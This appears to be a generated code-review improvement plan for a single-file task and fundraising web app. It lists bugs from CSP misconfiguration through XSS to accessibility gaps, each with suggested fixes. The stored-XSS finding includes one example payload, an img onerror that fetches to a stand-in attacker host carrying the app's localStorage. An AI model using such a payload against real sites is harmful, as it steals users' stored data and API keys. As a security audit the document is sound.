# Givelink / Task OS — Improvement Plan
> Generated: 2026-06-24 | Codebase: `index.html` (12 893 lines), `givelink.html` (1 755 lines), `sw.js`, `vercel.json`

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

---

### P0-1 — CSP header blocks Supabase; cloud sync is silently dead in production

**What:** The `Content-Security-Policy` in `vercel.json` lists `connect-src` without `*.supabase.co`, so every Supabase auth and REST call is rejected by the browser with no user-visible error.

**Where:** `vercel.json:14` — the `connect-src` directive

**Why it matters:** Cloud sync was the flagship feature of commit #50. Any user who follows the setup steps and clicks "Connect & Sync" sees the status flicker to "⚠ auth 0" (network error) or silently do nothing, with no explanation. All five Supabase fetch calls (`_sbAuth`, `sbPull`, `sbPush`) are affected.

**Effort:** S

**Suggested fix:**
- Add `https://*.supabase.co` to the `connect-src` directive in `vercel.json:14`.
- Also consider adding `https://*.supabase.io` for legacy project URLs.
- Test by loading the deployed site and opening DevTools → Console to verify no CSP violations fire.

---

### P0-2 — `givelink.html` crashes on load when localStorage has malformed data

**What:** `givelink.html` calls `JSON.parse()` in `load()` with no try/catch; a truncated or corrupt `givelink_sprint` entry (e.g. after a storage quota write) throws an uncaught exception that halts all JavaScript.

**Where:** `givelink.html:448`

```js
// BROKEN — no error handling
function load(){const d=localStorage.getItem('givelink_sprint');if(d){const p=JSON.parse(d);S={...S,...p};}}
```

**Why it matters:** `index.html` already handles this correctly at line 2107. A storage quota hit on `index.html` (which happens first) can corrupt the tail of the `givelink_sprint` write, then any page refresh leaves Givelink completely blank. The user loses access to all sprint data with no error message.

**Effort:** S

**Suggested fix:**
- Mirror the pattern from `index.html:2107`:
  ```js
  function load(){const d=localStorage.getItem('givelink_sprint');if(d)try{const p=JSON.parse(d);S={...S,...p};}catch(e){console.warn('Corrupt givelink_sprint, using defaults',e);}}
  ```
- Add the same guard to `givelink.html:447` `save()`: copy the `QuotaExceededError` check from `index.html:2100-2104`.

---

### P0-3 — Claude API key is stored in the cloud-synced state blob

**What:** `S.claudeKey` lives inside the main `S` object which `sbPush()` serialises and uploads to Supabase verbatim. Anyone with Supabase dashboard access (or a Supabase data breach) gets the user's Anthropic API key in plaintext.

**Where:** `index.html:2036` (S declaration), `index.html:8505-8508` (`saveSettings`), `index.html:8608` (`sbPush` body)

**Why it matters:** The Anthropic key is a billing credential. Leaking it allows unlimited spend on behalf of the user. The key should never leave the device in any form.

**Effort:** S

**Suggested fix:**
- Move `claudeKey` out of `S` and store it exclusively in `localStorage` (like `taskos_about`, `taskos_readwise_key`):
  ```js
  // save
  if(k) localStorage.setItem('taskos_claude_key', k);
  // read
  S.claudeKey = localStorage.getItem('taskos_claude_key') || '';
  ```
- Remove `claudeKey` from the `S` default object so it is never included in `sbPush`.
- Strip it out during import: `delete d.claudeKey;` before `Object.assign(S, d)` in `importData`.

---

### P0-4 — `genAIChallenge` regex is broken; challenge generation always silently fails

**What:** `new RegExp(key + ':\s*(.+)')` — inside a string literal, `\s` is the letter `s`, not a whitespace escape. The regex becomes `/TITLE:s*(.+)/` and never matches Claude's output format.

**Where:** `index.html:5489`

**Why it matters:** Every call to "Generate AI Challenge" either shows "Could not parse AI response" or silently assigns an empty title and exits at the guard on line 5491. The entire AI challenge feature is non-functional.

**Effort:** S

**Suggested fix:**
- Change the string to use double-backslash for the regex whitespace class:
  ```js
  const getLine = (key) => {
    const m = result.match(new RegExp(key + ':\\s*(.+)'));
    return m ? m[1].trim() : '';
  };
  ```
- Or switch to a regex literal: `result.match(/TITLE:\s*(.+)/i)?.[1]?.trim() || ''`.

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

---

### P1-1 — Stored XSS: task titles injected raw into innerHTML in 3+ critical flows

**What:** Task titles reach `innerHTML` unescaped in the delete-undo toast, the Weekly Review wizard (steps 1 and 3), and the blocker dependency dropdown.

**Where:**
- `index.html:3131` — delete undo toast: `` `...<strong>${t.title.slice(0,30)}</strong>...` ``
- `index.html:2888` — review wizard step 1: `` `...<div class="tt">...${t.title}...` ``
- `index.html:2895` — review wizard step 3: `` `...<div class="tt">${t.title}...` ``
- `index.html:2062` — blocker `<option>` text: `'>' + t.title.slice(0,45) + '</option>'`

**Why it matters:** A task title like `<img src=x onerror="fetch('https://evil.example?k='+localStorage.getItem('taskos'))">` executes on the next page load and exfiltrates the entire state including the Anthropic key. While this is a self-XSS today (single user), Supabase sync means the payload can persist and execute on other devices.

**Effort:** S

**Suggested fix:**
- At line 3131: wrap with `esc()`: `` `...<strong>${esc(t.title.slice(0,30))}</strong>...` ``
- At lines 2888, 2895: replace `${t.title}` with `${esc(t.title)}` and `${g.title}` with `${esc(g.title)}`.
- At line 2062: `'>' + esc(t.title.slice(0,45)) + '</option>'`.
- Audit the entire file with: `grep -n 'innerHTML.*\${[^}]*\.title' index.html | grep -v 'esc('` and apply `esc()` to every hit.

---

### P1-2 — Push notification icon references a non-existent directory; notifications show as broken

**What:** `sw.js:37-38` sets `icon` and `badge` to `'./icons/icon-192.png'`, but the `icons/` directory does not exist in the repository. The app only ships `icon.svg` and `icon-gl.svg`.

**Where:** `sw.js:37-38`

**Why it matters:** Any push notification the app sends (reminders, streak nudges) will display a broken-image icon on Android and Chrome desktop, undermining trust in the app's quality at exactly the moment it's trying to drive re-engagement.

**Effort:** S

**Suggested fix:**
- Either add a `icons/icon-192.png` raster file and add it to `sw.js:3-7` `STATIC` cache array, or — simpler — point to the existing SVG:
  ```js
  icon: './icon.svg',
  badge: './icon.svg',
  ```
- SVG icons are supported for web push notifications on Chrome/Edge. Update `sw.js:37-38` and `sw.js:38`.

---

### P1-3 — `givelink.html` AI Sprint Planner uses invalid model ID `claude-opus-4-5`

**What:** `runAiSprintPlanner()` hardcodes `model: 'claude-opus-4-5'` which is not a valid Anthropic model ID. The current Opus ID is `claude-opus-4-8`.

**Where:** `givelink.html:1140`

**Why it matters:** Every click of "✨ Generate" in the AI Sprint Planner returns a 404/400 API error. The error body is shown verbatim in the UI (line 1158), which dumps raw JSON with the error to the user. The Givelink sprint planning feature is non-functional.

**Effort:** S

**Suggested fix:**
- Change to the correct model ID: `model: 'claude-haiku-4-5-20251001'` for speed/cost, or `'claude-sonnet-4-6'` for better sprint planning quality.
- Align with the model used in `index.html:4139` for consistency.

---

### P1-4 — `givelink.html` falls back to `window.prompt()` for API key; reads from wrong key

**What:** `getApiKey()` first tries `taskos_profiles` (a data structure that no longer exists in Task OS), then `taskos_api_key` (a separate deprecated key), then calls `window.prompt()`. Meanwhile `callClaudeGL()` at line 1257 does its own lookup and correctly checks `localStorage.getItem('taskos')` → `.claudeKey`. The two code paths are inconsistent.

**Where:** `givelink.html:1075-1087` (`getApiKey`), `givelink.html:1257-1261` (`callClaudeGL`)

**Why it matters:** Users who configured their Claude key in Task OS Settings will see a browser native prompt interrupting them when they try to use the AI Sprint Planner, because `getApiKey()` doesn't look in the right place. The native dialog is visually jarring and unbranded.

**Effort:** S

**Suggested fix:**
- Replace `getApiKey()` with the same lookup logic already in `callClaudeGL`:
  ```js
  function getApiKey(){
    let k = localStorage.getItem('taskos_api_key');
    if(!k){ try{ k = JSON.parse(localStorage.getItem('taskos')||'{}').claudeKey||''; }catch(e){} }
    return k||null;
  }
  ```
- Remove the `window.prompt()` fallback; instead show an inline error directing users to Task OS Settings.

---

### P1-5 — `syncToTaskOS()` reads a non-existent localStorage structure; silently does nothing

**What:** `syncToTaskOS()` reads `taskos_profiles` — a multi-profile schema that was never implemented in `index.html`. Task OS stores everything in `taskos` (a single state blob). The function always hits `profiles.length === 0` and shows "No Task OS profile found", leaving users thinking they need to create a profile.

**Where:** `givelink.html:1206-1250`

**Why it matters:** The "🔗 Sync to Task OS" button in the sprint bar top CTA is one of the primary ways Givelink data flows into the daily task list. It has never worked. Done sprint tasks never propagate back.

**Effort:** M

**Suggested fix:**
- Rewrite to read from the single `taskos` key:
  ```js
  let tosData;
  try { tosData = JSON.parse(localStorage.getItem('taskos') || '{}'); } catch(e){ tosData = {}; }
  if(!Array.isArray(tosData.tasks)) tosData.tasks = [];
  ```
- Match by title (existing logic is fine), update status, write back:
  ```js
  localStorage.setItem('taskos', JSON.stringify(tosData));
  ```
- Remove all `taskos_profiles` / `taskos_data_*` references from `givelink.html`.

---

### P1-6 — Supabase auth failure leaves the user with no recovery path

**What:** When `sbConnect()` fails (wrong URL, wrong credentials, unconfirmed email), it calls `_sbSetStatus('⚠ …')` and shows a toast. There is no retry button, no link to docs, no inline field validation, and the "Connect & Sync" button is not re-enabled with focus.

**Where:** `index.html:8574-8590` (`sbConnect`)

**Why it matters:** Supabase setup requires copy-pasting a URL and anon key from a project dashboard. Typos are common. When the user gets "⚠ auth 401", they have no context on which field is wrong. The friction causes abandonment of the cloud sync feature entirely.

**Effort:** M

**Suggested fix:**
- Add specific error messages: 401 → "Check your anon key", 404 → "Check your Supabase project URL", network error → "Check your internet connection."
- After a failed attempt, re-focus the most likely offending field.
- Add a link to the Supabase dashboard and setup docs inline in the Settings modal near the Supabase fields.

---

## 🛠 P2 — Code health (tech debt slowing velocity)

---

### P2-1 — Two conflicting modal-close helpers exist side by side

**What:** `closeM(id)` (line 3391) and `closeModal(id)` (line 10584) both do `getElementById(id).classList.add('hidden')`. A comment at 10583 says "some modals use closeModal, some closeM — unify." Both are used throughout the file and the mix causes silent no-ops when the wrong one is called.

**Where:** `index.html:3391` (`closeM`), `index.html:10583-10584` (`closeModal`)

**Why it matters:** Every new modal added by a developer has a 50% chance of using the wrong close helper. This has already created one bug: `saveWin()` calls `closeModal('win-modal')` (correct) but `win-modal` also has `closeM` in its HTML button. Divergent paths make it impossible to add cross-cutting behavior (e.g. auto-save on close).

**Effort:** S

**Suggested fix:**
- Delete `closeModal` and replace its 8 call sites with `closeM`.
- Or reverse: delete `closeM` and make `closeModal` the canonical name. Either is fine.
- Grep for all modal IDs and verify each button uses the surviving helper.

---

### P2-2 — Empty `catch(e){}` blocks swallow production errors in 6+ places

**What:** Multiple catch blocks throughout both files silently discard exceptions, making it impossible to diagnose failures without source-level debugging.

**Where:**
- `index.html:2501` — review draft banner render
- `index.html:8657` — `_autoSnapshot()`
- `index.html:9433` — notes synthesis parse
- `givelink.html:1083` — `getApiKey()` profiles lookup
- `givelink.html:1208-1209, 1213-1214` — `syncToTaskOS()`

**Why it matters:** When the app silently fails (as several features currently do), there is no signal — no console log, no toast, no Sentry event — to tell the developer which path is broken. Each of these silent catches is hiding at least one real error path.

**Effort:** S

**Suggested fix:**
- Add at minimum `console.warn('context:', e)` to every bare `catch(e){}` that currently has no body.
- For user-facing operations (sync, import, AI calls), surface a toast on failure: `catch(e){ toast('⚠ Failed: ' + e.message); console.warn(e); }`.

---

### P2-3 — `givelink.html` `save()` has no storage quota guard

**What:** `save()` in `givelink.html` calls `localStorage.setItem()` with no try/catch. If the 5 MB quota is hit (likely after accumulating many past sprints and nonprofits), the call throws and corrupts the partial write, leading to the P0-2 crash on next load.

**Where:** `givelink.html:447`

**Why it matters:** `index.html` already has this guard at lines 2099-2104 with a user-facing toast. Givelink stores sprint history in `pastSprints` and CRM data, which grows unboundedly.

**Effort:** S

**Suggested fix:**
- Copy the guard from `index.html:2099-2104`:
  ```js
  function save(){
    try{ localStorage.setItem('givelink_sprint', JSON.stringify(S)); }
    catch(e){
      if(e.name==='QuotaExceededError'||e.code===22)
        toast('⚠️ Storage full! Export sprint data.',5000);
    }
  }
  ```

---

### P2-4 — Old wins (created before the title field) show blank in AI context

**What:** Wins created via `completeChallenge()`, EOD ritual, or early versions use a `text` field. `aiSuggestWins()` at line 10181 maps with `w => w.title`, which is `undefined` for legacy entries, producing an empty string in the AI prompt.

**Where:** `index.html:10181`

**Why it matters:** Users who have been logging wins since before the title field was added (many entries in `S.wins` from challenge completions use only `text`) will get AI suggestions that ignore their entire history.

**Effort:** S

**Suggested fix:**
- Change line 10181 to: `(S.wins||[]).slice(-10).map(w => w.title || w.text || '').filter(Boolean).join(', ')`
- Apply the same `w.title||w.text` fallback in the AI prompts at `index.html:7428`, `10660`, `11197` for consistency.

---

### P2-5 — Duplicate API key resolution logic in `givelink.html`

**What:** `getApiKey()` (line 1075) and the inline logic in `callClaudeGL()` (line 1257) both independently search for the API key with different priority orders. `callClaudeGL` correctly reads `taskos → .claudeKey`; `getApiKey` does not.

**Where:** `givelink.html:1075-1087` and `givelink.html:1256-1262`

**Why it matters:** Any future change to the key storage location must be made in two places. Already causing the P1-4 bug where the AI Sprint Planner (which calls `getApiKey`) can't find a key that `callClaudeGL` (used for standup/velocity) finds just fine.

**Effort:** S

**Suggested fix:**
- Consolidate: have `callClaudeGL` call `getApiKey()` rather than inlining its own lookup.
- Once P1-4 is fixed, `getApiKey` becomes the single source of truth.

---

### P2-6 — `index.html` is a single 12 893-line file with no build tooling

**What:** All CSS, HTML, and JavaScript live in one file. There is no linting, no bundling, no type checking, and no automated tests. Any refactoring touches a shared global namespace.

**Where:** `index.html` (entire file)

**Why it matters:** The file is already past the point where a developer can reliably search for a function without finding 3 similarly-named ones. The duplicate-helpers pattern (P2-1) and the regex bug (P0-4) are symptoms. Onboarding a second developer is impractical.

**Effort:** L

**Suggested fix:**
- This is the only L in this plan and only worth doing after the P0/P1 items are resolved.
- Introduce Vite (zero-config, no framework required): split into `src/state.js`, `src/views/`, `src/ai.js`, etc., keeping the same plain-JS approach but with module boundaries, ESLint, and `vite build` output.
- Do not rewrite logic — migrate file by file, view by view, keeping the existing DOM structure.

---

## 💡 P3 — Nice to have

---

### P3-1 — Brand color drift: app-wide blue (#58a6ff) doesn't match brand purple spec

**What:** Both apps use GitHub-style blue as the primary accent color (`--accent:#58a6ff` in `index.html`, `--accent:#3b82f6` in `givelink.html`) rather than the brand purple (#6B3FA0 / #5718CA). The brand gradient in `index.html` uses `#58a6ff → #bc8cff`, which mixes blue and violet.

**Where:** `index.html:20-26` (`:root` CSS variables), `givelink.html:17`

**Why it matters:** Givelink is building a donor-facing fundraising product. Blue reads as "tech" (GitHub, Twitter); the brief's brand purple reads as "social impact" and differentiates from Stripe/Plaid blue. Any pitch deck screenshot or social share will look inconsistent with brand assets.

**Effort:** M

**Suggested fix:**
- Update `--accent` to `#5718CA` (dark-mode) and `#6B3FA0` (light-mode) in `index.html`.
- Update `--accent` to `#5718CA` in `givelink.html`.
- Update `theme_color` in both manifests and both `<meta name="theme-color">` tags.
- Audit pink-on-purple rule: ensure no badge or text using `#E353B6 / #C2185B` appears on a `#5718CA` background (insufficient contrast ratio).

---

### P3-2 — Hardcoded "Panos" fallback in AI context strings

**What:** `_wfAbout()` at line 4430 and the goal digest prompt at line 10183 hardcode `'Panos — Greek founder building Givelink...'` as the fallback when `getAboutMe()` returns empty. This will be wrong for any other user.

**Where:** `index.html:4430`, `index.html:10183`

**Why it matters:** If the app is ever shared with team members or demonstrated to investors, every AI output will begin "About Panos:" regardless of who is logged in.

**Effort:** S

**Suggested fix:**
- Replace the hardcoded string with `profileName + ' — details not set. Ask them to fill in their About Me in Settings.'`.
- Or prompt users to fill in About Me during the onboarding flow (`_maybeOnboard`) and block AI features behind it.

---

### P3-3 — No model selection in Settings; power users cannot upgrade from haiku

**What:** All `callClaude()` calls hardcode `claude-haiku-4-5-20251001`. There is no way for a user to choose a more capable model for complex tasks (goal digest, life coaching, weekly review AI).

**Where:** `index.html:4139`

**Why it matters:** Haiku is intentionally limited on reasoning tasks. Users pay for the API key themselves — they may prefer Sonnet for deeper AI coaching. The model choice also affects prompt quality perception.

**Effort:** S

**Suggested fix:**
- Add a model selector to Settings (next to the API key field) with options: Haiku (fast/cheap), Sonnet (balanced), Opus (best).
- Store the choice in `localStorage.setItem('taskos_model', value)`.
- Read it in `callClaude`: `model: localStorage.getItem('taskos_model') || 'claude-haiku-4-5-20251001'`.

---

### P3-4 — Accessibility: interactive elements missing `aria-label` and keyboard support

**What:** The FAB dial buttons (lines 1316-1321) have no `aria-label`. The undo toast link (line 3131) is an `<a href="#">` that is not keyboard-accessible. Many `<div onclick=...>` elements throughout the file lack `role="button"` and `tabindex="0"`.

**Where:** `index.html:1313-1322` (FAB dial), `index.html:3131` (undo toast), globally (div-buttons)

**Why it matters:** Screen reader users and keyboard-only users cannot use core task management functions. WCAG 2.1 AA requires all interactive elements to be reachable and labeled.

**Effort:** M

**Suggested fix:**
- Add `aria-label` to each `.fab-act` button (e.g. `aria-label="Add task to inbox"`).
- Convert the undo toast action to a real `<button>` element styled as a link.
- For the highest-traffic flows (task card, quick add, sidebar nav), add `role="button" tabindex="0" onkeydown="if(e.key==='Enter'||e.key===' ')this.click()"` to `<div onclick>` elements.
